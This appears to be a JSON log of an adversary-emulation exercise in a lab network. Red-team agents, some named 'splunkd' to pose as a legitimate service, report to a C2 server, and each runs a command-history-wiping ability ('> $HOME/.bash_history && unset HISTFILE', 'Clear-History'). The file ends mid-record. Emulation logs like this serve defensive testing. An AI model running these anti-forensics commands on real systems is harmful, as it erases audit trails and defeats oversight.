{"id": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "name": "Random attacker", "host_group": [{"paw": "xjcudr", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "databaseA", "location": "/home/databaseA/sandcat.go", "pid": 1534, "ppid": 1, "trusted": false, "executors": ["sh", "proc"], "privilege": "User", "exe_name": "sandcat.go", "host": "database-a", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.201.5"], "display_name": "database-a$databaseA", "created": "2024-04-26T23:32:40Z", "last_seen": "2024-04-26T23:32:50Z", "links": [{"id": "0f962997-dd5a-4a57-93be-69b0b78b8739", "paw": "xjcudr", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:32:40Z", "pin": 0, "pid": "1677", "facts": [], "relationships": [], "used": [], "unique": "0f962997-dd5a-4a57-93be-69b0b78b8739", "collect": "2024-04-26T23:32:40Z", "finish": "2024-04-26T23:32:40Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-a", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:32:40Z"}], "pending_contact": "HTTP"}, {"paw": "icoozw", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "tomcat", "location": "/home/tomcat/splunkd", "pid": 1459, "ppid": 1, "trusted": false, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "splunkd", "host": "webserver-a", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.200.3"], "display_name": "webserver-a$tomcat", "created": "2024-04-26T23:32:41Z", "last_seen": "2024-04-26T23:33:00Z", "links": [{"id": "ebf235bd-7f2f-4e3b-8e1e-7dae39aa5271", "paw": "icoozw", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:32:41Z", "pin": 0, "pid": "1523", "facts": [], "relationships": [], "used": [], "unique": "ebf235bd-7f2f-4e3b-8e1e-7dae39aa5271", "collect": "2024-04-26T23:32:41Z", "finish": "2024-04-26T23:32:41Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-a", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:32:41Z"}], "pending_contact": "HTTP"}, {"paw": "bgynhy", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "tomcat", "location": "/home/tomcat/splunkd", "pid": 5631, "ppid": 1, "trusted": false, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "splunkd", "host": "decoy-0", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.201.129"], "display_name": "decoy-0$tomcat", "created": "2024-04-26T23:32:41Z", "last_seen": "2024-04-26T23:32:41Z", "links": [{"id": "d249881c-c2f5-4128-8755-8591c92a50ec", "paw": "bgynhy", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:32:41Z", "pin": 0, "pid": "5660", "facts": [], "relationships": [], "used": [], "unique": "d249881c-c2f5-4128-8755-8591c92a50ec", "collect": "2024-04-26T23:32:41Z", "finish": "2024-04-26T23:32:41Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-0", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:32:41Z"}], "pending_contact": "HTTP"}, {"paw": "yqnzhp", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "databaseB", "location": "/home/databaseB/sandcat.go", "pid": 1186, "ppid": 1, "trusted": false, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "sandcat.go", "host": "database-b", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.201.6"], "display_name": "database-b$databaseB", "created": "2024-04-26T23:32:41Z", "last_seen": "2024-04-26T23:32:54Z", "links": [{"id": "60f5370f-d7a2-4f16-ab2f-ccb475332d22", "paw": "yqnzhp", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:32:41Z", "pin": 0, "pid": "1351", "facts": [], "relationships": [], "used": [], "unique": "60f5370f-d7a2-4f16-ab2f-ccb475332d22", "collect": "2024-04-26T23:32:41Z", "finish": "2024-04-26T23:32:41Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-b", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:32:41Z"}], "pending_contact": "HTTP"}, {"paw": "rvxncq", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "employeeB", "location": "/home/employeeB/sandcat.go", "pid": 1532, "ppid": 1, "trusted": false, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "sandcat.go", "host": "employee-b", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.201.4"], "display_name": "employee-b$employeeB", "created": "2024-04-26T23:32:41Z", "last_seen": "2024-04-26T23:32:51Z", "links": [{"id": "e32f7acf-0935-45bf-9d81-1926959850a5", "paw": "rvxncq", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:32:41Z", "pin": 0, "pid": "1607", "facts": [], "relationships": [], "used": [], "unique": "e32f7acf-0935-45bf-9d81-1926959850a5", "collect": "2024-04-26T23:32:41Z", "finish": "2024-04-26T23:32:41Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-b", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:32:41Z"}], "pending_contact": "HTTP"}, {"paw": "ajzpxu", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "tomcat", "location": "/home/tomcat/splunkd", "pid": 1373, "ppid": 1, "trusted": false, "executors": ["sh", "proc"], "privilege": "User", "exe_name": "splunkd", "host": "webserver-c", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.200.5"], "display_name": "webserver-c$tomcat", "created": "2024-04-26T23:32:41Z", "last_seen": "2024-04-26T23:33:00Z", "links": [{"id": "5d0c0713-76ab-410e-a64e-0cdb361a6331", "paw": "ajzpxu", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:32:41Z", "pin": 0, "pid": "1970", "facts": [], "relationships": [], "used": [], "unique": "5d0c0713-76ab-410e-a64e-0cdb361a6331", "collect": "2024-04-26T23:32:41Z", "finish": "2024-04-26T23:32:41Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:32:41Z"}], "pending_contact": "HTTP"}, {"paw": "bwgiiu", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "tomcat", "location": "/home/tomcat/splunkd", "pid": 1488, "ppid": 1, "trusted": false, "executors": ["sh", "proc"], "privilege": "User", "exe_name": "splunkd", "host": "webserver-b", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.200.4"], "display_name": "webserver-b$tomcat", "created": "2024-04-26T23:32:42Z", "last_seen": "2024-04-26T23:32:58Z", "links": [{"id": "2d48c035-b377-44a4-b73e-100d7c6da783", "paw": "bwgiiu", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:32:42Z", "pin": 0, "pid": "1560", "facts": [], "relationships": [], "used": [], "unique": "2d48c035-b377-44a4-b73e-100d7c6da783", "collect": "2024-04-26T23:32:42Z", "finish": "2024-04-26T23:32:42Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:32:42Z"}], "pending_contact": "HTTP"}, {"paw": "egaqwi", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "tomcat", "location": "/home/tomcat/splunkd", "pid": 5659, "ppid": 1, "trusted": false, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "splunkd", "host": "decoy-1", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.200.81"], "display_name": "decoy-1$tomcat", "created": "2024-04-26T23:32:42Z", "last_seen": "2024-04-26T23:32:42Z", "links": [{"id": "088a58e4-ba82-4a2c-a357-e686738df84d", "paw": "egaqwi", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:32:42Z", "pin": 0, "pid": "5683", "facts": [], "relationships": [], "used": [], "unique": "088a58e4-ba82-4a2c-a357-e686738df84d", "collect": "2024-04-26T23:32:42Z", "finish": "2024-04-26T23:32:42Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-1", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:32:42Z"}], "pending_contact": "HTTP"}, {"paw": "hiweju", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "employeeA", "location": "/home/employeeA/sandcat.go", "pid": 1746, "ppid": 1, "trusted": false, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "sandcat.go", "host": "employee-a", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.201.3"], "display_name": "employee-a$employeeA", "created": "2024-04-26T23:32:43Z", "last_seen": "2024-04-26T23:32:49Z", "links": [{"id": "55afb72c-01a1-4e34-8a69-7e84a894f5c1", "paw": "hiweju", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:32:43Z", "pin": 0, "pid": "1802", "facts": [], "relationships": [], "used": [], "unique": "55afb72c-01a1-4e34-8a69-7e84a894f5c1", "collect": "2024-04-26T23:32:43Z", "finish": "2024-04-26T23:32:43Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-a", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:32:43Z"}], "pending_contact": "HTTP"}, {"paw": "hauitn", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "location": "/root/splunkd", "pid": 1083, "ppid": 1, "trusted": false, "executors": ["proc", "sh"], "privilege": "Elevated", "exe_name": "splunkd", "host": "attacker", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.202.3"], "display_name": "attacker$root", "created": "2024-04-26T23:32:43Z", "last_seen": "2024-04-26T23:32:52Z", "links": [{"id": "6a0ebe5c-b9ae-4e37-af75-2fc78aa6652e", "paw": "hauitn", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:32:43Z", "pin": 0, "pid": "1639", "facts": [], "relationships": [], "used": [], "unique": "6a0ebe5c-b9ae-4e37-af75-2fc78aa6652e", "collect": "2024-04-26T23:32:43Z", "finish": "2024-04-26T23:32:43Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:32:43Z"}], "pending_contact": "HTTP"}, {"paw": "rezmky", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "location": "/root/splunkd", "pid": 1094, "ppid": 1, "trusted": true, "executors": ["proc", "sh"], "privilege": "Elevated", "exe_name": "splunkd", "host": "attacker", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.202.3"], "display_name": "attacker$root", "created": "2024-04-26T23:33:44Z", "last_seen": "2024-04-26T23:51:58Z", "links": [{"id": "83ca423d-b59b-45aa-ac64-b2faf4350c08", "paw": "rezmky", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:33:44Z", "pin": 0, "pid": "1100", "facts": [], "relationships": [], "used": [], "unique": "83ca423d-b59b-45aa-ac64-b2faf4350c08", "collect": "2024-04-26T23:33:44Z", "finish": "2024-04-26T23:33:44Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, 